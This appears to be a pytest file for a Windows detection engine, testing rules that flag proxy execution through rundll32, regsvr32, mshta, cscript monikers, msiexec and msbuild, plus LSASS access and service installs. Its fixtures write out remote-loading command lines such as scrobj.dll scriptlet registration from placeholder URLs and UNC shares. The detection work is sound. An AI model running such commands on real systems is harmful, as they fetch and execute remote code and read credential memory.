"""Path/proxy decisions exercised through native normalization and publication."""
import itertools

import pytest

from romulus.detect.windows_memory_events import LsassProcessAccess
from romulus.detect.windows_proxy import (
    CompilerProxyExecution,
    MshtaExecution,
    MsiexecRemotePackage,
    Regsvr32Execution,
    Rundll32Execution,
    ScriptHostRemoteOrWritable,
)
from romulus.detect.windows_registration_events import ServiceRegistration
from romulus.evidence.windows import normalize_windows
from tests.test_windows_b_round3 import fold
from tests.test_windows_b_round5 import native, proc
from tests.windows_fixtures import LogicalWindowsEvent, windows_hit
from tests.windows_process_support import run

WRITABLE = [r'Tasks', r'Tasks_Migrated', r'tracing', r'spool\drivers\color',
            r'spool\PRINTERS', r'spool\SERVERS', r'Microsoft\Crypto\RSA\MachineKeys',
            r'com\dmp', r'FxsTmp', r'LogFiles\WMI']
REMOTE = [r'\\server\share\a', r'\\?\UNC\server\share\a', r'\??\UNC\server\share\a',
          r'\\.\UNC\server\share\a', r'\\?\GLOBALROOT\Device\Mup\server\share\a',
          '//server/share/a', 'https://example.test/a', 'ftp://example.test/a', 'file://server/share/a']
_IDS = itertools.count(990000)


@pytest.mark.parametrize('system', ['System32', 'SysWOW64'])
@pytest.mark.parametrize('directory', WRITABLE)
@pytest.mark.parametrize('consumer', ['rundll', 'regsvr', 'script', 'hta', 'cwd', 'memory', 'service'])
def test_writable_system_subdirectory_reaches_every_consumer(system, directory, consumer):
    root = fr'C:\Windows\{system}\{directory}'
    if consumer == 'memory':
        [match], _ = fold(LsassProcessAccess(), [native(10, {'SourceImage': root + r'\source.exe',
            'TargetImage': r'C:\Windows\System32\lsass.exe', 'GrantedAccess': '0x10'})])
        assert match.proposed_lane == 'high'
    elif consumer == 'service':
        event = normalize_windows(windows_hit(LogicalWindowsEvent('System', 'Service Control Manager',
            7045, 'ws01', next(_IDS), '2026-01-02T03:00:00Z',
            {'ServiceName': 'Example', 'ImagePath': root + r'\service.exe', 'ServiceType': '16'}), 'winlogbeat_8'))
        matches, _ = fold(ServiceRegistration(), [event])
        assert matches
    else:
        rule, image, argument = {
            'rundll': (Rundll32Execution, 'rundll32.exe', root + r'\helper.dll,Start'),
            'regsvr': (Regsvr32Execution, 'regsvr32.exe', '/s ' + root + r'\helper.dll'),
            'script': (ScriptHostRemoteOrWritable, 'cscript.exe', '//nologo ' + root + r'\helper.vbs'),
            'hta': (MshtaExecution, 'mshta.exe', root + r'\page.hta'),
            'cwd': (Rundll32Execution, 'rundll32.exe', 'helper.dll,Start'),
        }[consumer]
        [match] = run(rule(), [proc(image, f'{image} {argument}', root + '\\')])
        assert match.proposed_lane == 'lead'


@pytest.mark.parametrize('root', [r'%windir%\System32\Tasks', r'%systemroot%\SysWOW64\Tasks',
    r'\\?\C:\Windows\System32\Tasks', r'\\.\C:\Windows\SysWOW64\Tasks',
    'C:/Windows/System32/Tasks'])
@pytest.mark.parametrize('rule,image,argument', [
    (Rundll32Execution, 'rundll32.exe', 'helper.dll,Start'),
    (Regsvr32Execution, 'regsvr32.exe', r'.\helper.dll'),
    (ScriptHostRemoteOrWritable, 'cscript.exe', r'.\script.vbs')])
def test_writable_system_cwd_spelling_is_used_for_relative_operands(root, rule, image, argument):
    [match] = run(rule(), [proc(image, f'{image} {argument}', root + '\\')])
    assert match.proposed_lane == 'lead'
    assert any(field.field == 'process.current_directory' for field in match.predicate)


@pytest.mark.parametrize('target', [r'C:\Windows\System32\nested\desk.cpl',
    r'C:\Windows\SysWOW64\nested\file.bin', r'C:\Windows\System32\Tasks\ABCDEF~1.DLL',
    r'%windir%\System32\Tasks\a.cpl', r'\\?\C:\Windows\System32\Tasks\a.cpl',
    'C:/Windows/System32/Tasks/a.cpl'])
def test_control_panel_nested_system_target_is_a_lead(target):
    [match] = run(Rundll32Execution(), [proc('rundll32.exe', f'rundll32.exe shell32.dll,Control_RunDLL {target}')])
    assert match.proposed_lane == 'lead'
    if '~1' in target:
        assert '8.3 short form' in match.claim


@pytest.mark.parametrize('target', ['desk.cpl', r'C:\Windows\System32\desk.cpl',
    r'%windir%\System32\desk.cpl', r'\\?\C:\Windows\SysWOW64\desk.cpl',
    'C:/Windows/System32/Tasks/../desk.cpl'])
def test_control_panel_direct_system_target_stays_quiet(target):
    assert not run(Rundll32Execution(), [proc('rundll32.exe', f'rundll32.exe shell32.dll,Control_RunDLL {target}')])


@pytest.mark.parametrize('target', REMOTE)
@pytest.mark.parametrize('consumer', ['rundll', 'regsvr', 'regsvr-i', 'script', 'hta', 'msi', 'msbuild'])
def test_remote_forms_share_one_predicate(consumer, target):
    rule, image, argument, lane = {
        'rundll': (Rundll32Execution, 'rundll32.exe', target + '.dll,Start', 'high'),
        'regsvr': (Regsvr32Execution, 'regsvr32.exe', '/s ' + target + '.dll', 'lead'),
        'regsvr-i': (Regsvr32Execution, 'regsvr32.exe', '/s /i:' + target + '.sct scrobj.dll', 'high'),
        'script': (ScriptHostRemoteOrWritable, 'cscript.exe', '//nologo ' + target + '.js', 'lead'),
        'hta': (MshtaExecution, 'mshta.exe', target + '.hta', 'high'),
        'msi': (MsiexecRemotePackage, 'msiexec.exe', '/i ' + target + '.msi',
                'high' if target.startswith(('http://', 'https://', 'ftp://')) else 'lead'),
        'msbuild': (CompilerProxyExecution, 'msbuild.exe', target + '.xml', 'lead'),
    }[consumer]
    [match] = run(rule(), [proc(image, f'{image} {argument}')])
    assert match.proposed_lane == lane


@pytest.mark.parametrize('target', REMOTE)
@pytest.mark.parametrize('moniker', ['script:', 'scriptlet:'])
def test_remote_script_moniker_is_high(target, moniker):
    command = f'cscript.exe C:\\Windows\\System32\\pubprn.vbs localhost {moniker}{target}.sct'
    [match] = run(ScriptHostRemoteOrWritable(), [proc('cscript.exe', command)])
    assert match.proposed_lane == 'high'
    assert 'argument 3' in match.claim and moniker in match.claim and 'pubprn.vbs' in match.claim


@pytest.mark.parametrize('target,expected', [(r'C:\Users\Public\a.sct', True),
    (r'C:\Windows\System32\Tasks\a.sct', True), (r'C:\Tools\a.sct', False),
    (r'C:\Windows\System32\a.sct', False)])
def test_local_moniker_only_writable_targets_are_leads(target, expected):
    matches = run(ScriptHostRemoteOrWritable(), [proc('cscript.exe',
        f'cscript.exe C:\\Windows\\System32\\pubprn.vbs localhost script:{target}')])
    assert bool(matches) is expected
    if expected:
        assert matches[0].proposed_lane == 'lead' and 'argument 3' in matches[0].claim


@pytest.mark.parametrize('export,lane', [('scrobj.dll,GenerateTypeLib', 'high'),
    ('dfshim.dll,ShOpenVerbApplication', 'high'), ('shell32.dll,Control_RunDLLAsUser', 'high'),
    ('shell32.dll,Control_RunDLLW', 'high'), ('shell32.dll,#44', 'lead'),
    ('davclnt.dll,DavSetCookie', 'lead'), ('printui.dll,PrintUIEntry', 'lead')])
@pytest.mark.parametrize('target', REMOTE)
def test_any_export_remote_argument_is_at_least_lead(export, lane, target):
    [match] = run(Rundll32Execution(), [proc('rundll32.exe', f'rundll32.exe {export} /arg {target}')])
    assert match.proposed_lane == lane and target in match.claim
    assert 'was given remote argument' in match.claim


def test_proxy_script_plain_file_url_is_a_lead():
    [match] = run(ScriptHostRemoteOrWritable(), [proc('cscript.exe',
        'cscript.exe C:\\Windows\\System32\\pubprn.vbs localhost file://server/share/a.sct')])
    assert match.proposed_lane == 'lead'


@pytest.mark.parametrize('local', [r'script:C:\Users\Public\a.sct', r'scriptlet:C:\Windows\System32\Tasks\a.sct'])
@pytest.mark.parametrize('remote', ['script:https://example.test/b.sct',
    r'script:\\server\share\b.sct', 'scriptlet:file://server/share/b.sct'])
@pytest.mark.parametrize('local_first', [True, False])
def test_remote_moniker_wins_over_local_moniker_in_either_argument_order(local, remote, local_first):
    args = [local, remote] if local_first else [remote, local]
    command = 'cscript.exe C:\\Windows\\System32\\pubprn.vbs localhost ' + ' '.join(args)
    [match] = run(ScriptHostRemoteOrWritable(), [proc('cscript.exe', command)])
    assert match.proposed_lane == 'high' and remote in match.claim


@pytest.mark.parametrize('prefix', ['\\\\', '\\\\?\\UNC\\', '\\??\\UNC\\', '\\\\.\\UNC\\',
    '\\\\?\\GLOBALROOT\\Device\\Mup\\'])
@pytest.mark.parametrize('tail', ['', 'server', 'server\\'])
@pytest.mark.parametrize('consumer', ['hta', 'rundll', 'script', 'moniker'])
def test_unc_namespace_needs_a_server_and_share(prefix, tail, consumer):
    target = prefix + tail
    rule, image, arguments = {
        'hta': (MshtaExecution, 'mshta.exe', target),
        'rundll': (Rundll32Execution, 'rundll32.exe', target + ',Start'),
        'script': (ScriptHostRemoteOrWritable, 'cscript.exe', target),
        'moniker': (ScriptHostRemoteOrWritable, 'cscript.exe',
                    'C:\\Windows\\System32\\pubprn.vbs localhost script:' + target),
    }[consumer]
    assert not run(rule(), [proc(image, f'{image} {arguments}')])


@pytest.mark.parametrize('url', ['https://example.test', 'ftp://example.test', 'file://server/'])
def test_unc_share_requirement_does_not_narrow_remote_urls(url):
    [match] = run(MshtaExecution(), [proc('mshta.exe', 'mshta.exe ' + url)])
    assert match.proposed_lane == 'high'


@pytest.mark.parametrize('prefix', [r'\\?\C:', r'\\.\C:'])
@pytest.mark.parametrize('rule,image,suffix', [(MshtaExecution, 'mshta.exe', '.hta'),
    (ScriptHostRemoteOrWritable, 'cscript.exe', '.vbs')])
def test_local_device_path_is_never_called_unc(prefix, rule, image, suffix):
    [match] = run(rule(), [proc(image, f'{image} {prefix}\\Users\\Public\\a{suffix}')])
    assert match.proposed_lane == 'lead' and 'UNC' not in match.claim


@pytest.mark.parametrize('prefix', [r'\\?\C:', r'\\.\C:'])
@pytest.mark.parametrize('rule,image,suffix', [(MshtaExecution, 'mshta.exe', '.hta'),
    (ScriptHostRemoteOrWritable, 'cscript.exe', '.vbs'),
    (CompilerProxyExecution, 'msbuild.exe', '.xml'), (MsiexecRemotePackage, 'msiexec.exe', '.msi')])
def test_local_device_system_file_does_not_create_a_remote_finding(prefix, rule, image, suffix):
    flag = '/i ' if image == 'msiexec.exe' else ''
    assert not run(rule(), [proc(image, f'{image} {flag}{prefix}\\Windows\\System32\\a{suffix}')])


def test_regsvr_unicode_dash_is_not_a_documented_switch():
    [match] = run(Regsvr32Execution(), [proc('regsvr32.exe',
        'regsvr32.exe –i:https://example.test/a.sct scrobj.dll')])
    assert match.proposed_lane == 'lead'
    assert 'attempted scriptlet registration' in match.claim
    assert any('acceptance by the OS is not established' in note for note in match.notes)


@pytest.mark.parametrize('switch', ['/s', '-S', '/u', '/n', '/c', '/i', '/i:local', '-I:local'])
def test_regsvr_known_switches_do_not_become_library_operands(switch):
    assert not run(Regsvr32Execution(), [proc('regsvr32.exe', f'regsvr32.exe {switch} kernel32.dll', r'C:\Users\alice')])


def test_rundll32_first_token_is_a_library_even_when_it_looks_like_a_switch():
    assert not run(Rundll32Execution(), [proc('rundll32.exe', r'rundll32.exe /s \\server\share\a.dll,Start')])


@pytest.mark.parametrize('token', ['/unknown:C:\\Users\\Public\\a.dll', '//server/share/a.dll'])
def test_regsvr_unknown_switch_shaped_token_is_an_operand(token):
    [match] = run(Regsvr32Execution(), [proc('regsvr32.exe', 'regsvr32.exe ' + token)])
    assert match.proposed_lane == 'lead'


def test_short_bare_library_working_directory_is_unresolved_lead():
    [match] = run(Rundll32Execution(), [proc('rundll32.exe', 'rundll32.exe helper.dll,Start', r'C:\PROGRA~3\work')])
    assert match.proposed_lane == 'lead' and '8.3 short form' in match.claim
    assert any(field.field == 'process.current_directory' for field in match.predicate)


def test_unknown_lsass_frame_names_an_unresolved_module():
    [match], _ = fold(LsassProcessAccess(), [native(10, {'SourceImage': r'C:\Program Files\Vendor\agent.exe',
        'TargetImage': r'C:\Windows\System32\lsass.exe', 'GrantedAccess': '0x10', 'CallTrace': 'UNKNOWN(000000001234)'})])
    assert match.proposed_lane == 'high' and 'an unresolved module' in match.claim


@pytest.mark.parametrize('script', ['CL_Invocation.ps1', 'CL_Mutexverifiers.ps1', 'Pester.bat'])
def test_non_script_host_proxy_entries_do_not_classify_plain_url_arguments(script):
    prefix = f'cscript.exe C:\\Windows\\System32\\{script}'
    assert not run(ScriptHostRemoteOrWritable(), [proc('cscript.exe', prefix + ' https://example.test/a')])
    [match] = run(ScriptHostRemoteOrWritable(), [proc('cscript.exe', prefix + ' script:https://example.test/a')])
    assert match.proposed_lane == 'high'


# Complete fifty-case lowering set from the reviewer, retained as passive data.
_RECOVERED = [('ctrl.cpl C:\\Windows\\System32\\spool\\drivers\\color', 'rundll32.exe shell32.dll,Control_RunDLL C:\\Windows\\System32\\spool\\drivers\\color\\x.cpl', None), ('ctrlq.cpl C:\\Windows\\System32\\spool\\drivers\\color', 'rundll32.exe shell32.dll,Control_RunDLL "C:\\Windows\\System32\\spool\\drivers\\color\\x.cpl"', None), ('ctrl-rel-cwd C:\\Windows\\System32\\spool\\drivers\\color', 'rundll32.exe shell32.dll,Control_RunDLL .\\x.cpl', 'C:\\Windows\\System32\\spool\\drivers\\color\\'), ('ctrl.cpl C:\\Windows\\SysWOW64\\spool\\drivers\\color', 'rundll32.exe shell32.dll,Control_RunDLL C:\\Windows\\SysWOW64\\spool\\drivers\\color\\x.cpl', None), ('ctrlq.cpl C:\\Windows\\SysWOW64\\spool\\drivers\\color', 'rundll32.exe shell32.dll,Control_RunDLL "C:\\Windows\\SysWOW64\\spool\\drivers\\color\\x.cpl"', None), ('ctrl-rel-cwd C:\\Windows\\SysWOW64\\spool\\drivers\\color', 'rundll32.exe shell32.dll,Control_RunDLL .\\x.cpl', 'C:\\Windows\\SysWOW64\\spool\\drivers\\color\\'), ('ctrl.cpl C:\\Windows\\System32\\Tasks', 'rundll32.exe shell32.dll,Control_RunDLL C:\\Windows\\System32\\Tasks\\x.cpl', None), ('ctrlq.cpl C:\\Windows\\System32\\Tasks', 'rundll32.exe shell32.dll,Control_RunDLL "C:\\Windows\\System32\\Tasks\\x.cpl"', None), ('ctrl-rel-cwd C:\\Windows\\System32\\Tasks', 'rundll32.exe shell32.dll,Control_RunDLL .\\x.cpl', 'C:\\Windows\\System32\\Tasks\\'), ('ctrl.cpl C:\\Windows\\SysWOW64\\Tasks', 'rundll32.exe shell32.dll,Control_RunDLL C:\\Windows\\SysWOW64\\Tasks\\x.cpl', None), ('ctrlq.cpl C:\\Windows\\SysWOW64\\Tasks', 'rundll32.exe shell32.dll,Control_RunDLL "C:\\Windows\\SysWOW64\\Tasks\\x.cpl"', None), ('ctrl-rel-cwd C:\\Windows\\SysWOW64\\Tasks', 'rundll32.exe shell32.dll,Control_RunDLL .\\x.cpl', 'C:\\Windows\\SysWOW64\\Tasks\\'), ('ctrl.cpl C:\\Windows\\System32\\Tasks_Migrated', 'rundll32.exe shell32.dll,Control_RunDLL C:\\Windows\\System32\\Tasks_Migrated\\x.cpl', None), ('ctrlq.cpl C:\\Windows\\System32\\Tasks_Migrated', 'rundll32.exe shell32.dll,Control_RunDLL "C:\\Windows\\System32\\Tasks_Migrated\\x.cpl"', None), ('ctrl-rel-cwd C:\\Windows\\System32\\Tasks_Migrated', 'rundll32.exe shell32.dll,Control_RunDLL .\\x.cpl', 'C:\\Windows\\System32\\Tasks_Migrated\\'), ('ctrl.cpl C:\\Windows\\System32\\tracing', 'rundll32.exe shell32.dll,Control_RunDLL C:\\Windows\\System32\\tracing\\x.cpl', None), ('ctrlq.cpl C:\\Windows\\System32\\tracing', 'rundll32.exe shell32.dll,Control_RunDLL "C:\\Windows\\System32\\tracing\\x.cpl"', None), ('ctrl-rel-cwd C:\\Windows\\System32\\tracing', 'rundll32.exe shell32.dll,Control_RunDLL .\\x.cpl', 'C:\\Windows\\System32\\tracing\\'), ('ctrl.cpl C:\\Windows\\System32\\Microsoft\\Crypto\\RSA\\MachineKeys', 'rundll32.exe shell32.dll,Control_RunDLL C:\\Windows\\System32\\Microsoft\\Crypto\\RSA\\MachineKeys\\x.cpl', None), ('ctrlq.cpl C:\\Windows\\System32\\Microsoft\\Crypto\\RSA\\MachineKeys', 'rundll32.exe shell32.dll,Control_RunDLL "C:\\Windows\\System32\\Microsoft\\Crypto\\RSA\\MachineKeys\\x.cpl"', None), ('ctrl-rel-cwd C:\\Windows\\System32\\Microsoft\\Crypto\\RSA\\MachineKeys', 'rundll32.exe shell32.dll,Control_RunDLL .\\x.cpl', 'C:\\Windows\\System32\\Microsoft\\Crypto\\RSA\\MachineKeys\\'), ('ctrl.cpl C:\\Windows\\System32\\com\\dmp', 'rundll32.exe shell32.dll,Control_RunDLL C:\\Windows\\System32\\com\\dmp\\x.cpl', None), ('ctrlq.cpl C:\\Windows\\System32\\com\\dmp', 'rundll32.exe shell32.dll,Control_RunDLL "C:\\Windows\\System32\\com\\dmp\\x.cpl"', None), ('ctrl-rel-cwd C:\\Windows\\System32\\com\\dmp', 'rundll32.exe shell32.dll,Control_RunDLL .\\x.cpl', 'C:\\Windows\\System32\\com\\dmp\\'), ('ctrl.cpl C:\\Windows\\SysWOW64\\com\\dmp', 'rundll32.exe shell32.dll,Control_RunDLL C:\\Windows\\SysWOW64\\com\\dmp\\x.cpl', None), ('ctrlq.cpl C:\\Windows\\SysWOW64\\com\\dmp', 'rundll32.exe shell32.dll,Control_RunDLL "C:\\Windows\\SysWOW64\\com\\dmp\\x.cpl"', None), ('ctrl-rel-cwd C:\\Windows\\SysWOW64\\com\\dmp', 'rundll32.exe shell32.dll,Control_RunDLL .\\x.cpl', 'C:\\Windows\\SysWOW64\\com\\dmp\\'), ('ctrl.cpl C:\\Windows\\System32\\FxsTmp', 'rundll32.exe shell32.dll,Control_RunDLL C:\\Windows\\System32\\FxsTmp\\x.cpl', None), ('ctrlq.cpl C:\\Windows\\System32\\FxsTmp', 'rundll32.exe shell32.dll,Control_RunDLL "C:\\Windows\\System32\\FxsTmp\\x.cpl"', None), ('ctrl-rel-cwd C:\\Windows\\System32\\FxsTmp', 'rundll32.exe shell32.dll,Control_RunDLL .\\x.cpl', 'C:\\Windows\\System32\\FxsTmp\\'), ('ctrl.cpl C:\\Windows\\SysWOW64\\FxsTmp', 'rundll32.exe shell32.dll,Control_RunDLL C:\\Windows\\SysWOW64\\FxsTmp\\x.cpl', None), ('ctrlq.cpl C:\\Windows\\SysWOW64\\FxsTmp', 'rundll32.exe shell32.dll,Control_RunDLL "C:\\Windows\\SysWOW64\\FxsTmp\\x.cpl"', None), ('ctrl-rel-cwd C:\\Windows\\SysWOW64\\FxsTmp', 'rundll32.exe shell32.dll,Control_RunDLL .\\x.cpl', 'C:\\Windows\\SysWOW64\\FxsTmp\\'), ('ctrl.cpl C:\\Windows\\System32\\spool\\PRINTERS', 'rundll32.exe shell32.dll,Control_RunDLL C:\\Windows\\System32\\spool\\PRINTERS\\x.cpl', None), ('ctrlq.cpl C:\\Windows\\System32\\spool\\PRINTERS', 'rundll32.exe shell32.dll,Control_RunDLL "C:\\Windows\\System32\\spool\\PRINTERS\\x.cpl"', None), ('ctrl-rel-cwd C:\\Windows\\System32\\spool\\PRINTERS', 'rundll32.exe shell32.dll,Control_RunDLL .\\x.cpl', 'C:\\Windows\\System32\\spool\\PRINTERS\\'), ('ctrl.cpl C:\\Windows\\System32\\spool\\SERVERS', 'rundll32.exe shell32.dll,Control_RunDLL C:\\Windows\\System32\\spool\\SERVERS\\x.cpl', None), ('ctrlq.cpl C:\\Windows\\System32\\spool\\SERVERS', 'rundll32.exe shell32.dll,Control_RunDLL "C:\\Windows\\System32\\spool\\SERVERS\\x.cpl"', None), ('ctrl-rel-cwd C:\\Windows\\System32\\spool\\SERVERS', 'rundll32.exe shell32.dll,Control_RunDLL .\\x.cpl', 'C:\\Windows\\System32\\spool\\SERVERS\\'), ('ctrl.cpl C:\\Windows\\System32\\LogFiles\\WMI', 'rundll32.exe shell32.dll,Control_RunDLL C:\\Windows\\System32\\LogFiles\\WMI\\x.cpl', None), ('ctrlq.cpl C:\\Windows\\System32\\LogFiles\\WMI', 'rundll32.exe shell32.dll,Control_RunDLL "C:\\Windows\\System32\\LogFiles\\WMI\\x.cpl"', None), ('ctrl-rel-cwd C:\\Windows\\System32\\LogFiles\\WMI', 'rundll32.exe shell32.dll,Control_RunDLL .\\x.cpl', 'C:\\Windows\\System32\\LogFiles\\WMI\\'), ('ctrl.cpl %windir%\\System32\\Tasks', 'rundll32.exe shell32.dll,Control_RunDLL %windir%\\System32\\Tasks\\x.cpl', None), ('ctrlq.cpl %windir%\\System32\\Tasks', 'rundll32.exe shell32.dll,Control_RunDLL "%windir%\\System32\\Tasks\\x.cpl"', None), ('ctrl.cpl \\\\?\\C:\\Windows\\System32\\Tasks', 'rundll32.exe shell32.dll,Control_RunDLL \\\\?\\C:\\Windows\\System32\\Tasks\\x.cpl', None), ('ctrlq.cpl \\\\?\\C:\\Windows\\System32\\Tasks', 'rundll32.exe shell32.dll,Control_RunDLL "\\\\?\\C:\\Windows\\System32\\Tasks\\x.cpl"', None), ('ctrl-rel-cwd \\\\?\\C:\\Windows\\System32\\Tasks', 'rundll32.exe shell32.dll,Control_RunDLL .\\x.cpl', '\\\\?\\C:\\Windows\\System32\\Tasks\\'), ('ctrl.cpl c:/windows/system32/spool/drivers/color', 'rundll32.exe shell32.dll,Control_RunDLL c:/windows/system32/spool/drivers/color\\x.cpl', None), ('ctrlq.cpl c:/windows/system32/spool/drivers/color', 'rundll32.exe shell32.dll,Control_RunDLL "c:/windows/system32/spool/drivers/color\\x.cpl"', None), ('ctrl-rel-cwd c:/windows/system32/spool/drivers/color', 'rundll32.exe shell32.dll,Control_RunDLL .\\x.cpl', 'c:/windows/system32/spool/drivers/color\\')]


@pytest.mark.parametrize('label,command,cwd', _RECOVERED, ids=[row[0] for row in _RECOVERED])
def test_all_fifty_reviewer_system_directory_regressions_publish(label, command, cwd):
    [match] = run(Rundll32Execution(), [proc('rundll32.exe', command, cwd)])
    assert match.proposed_lane == 'lead', label
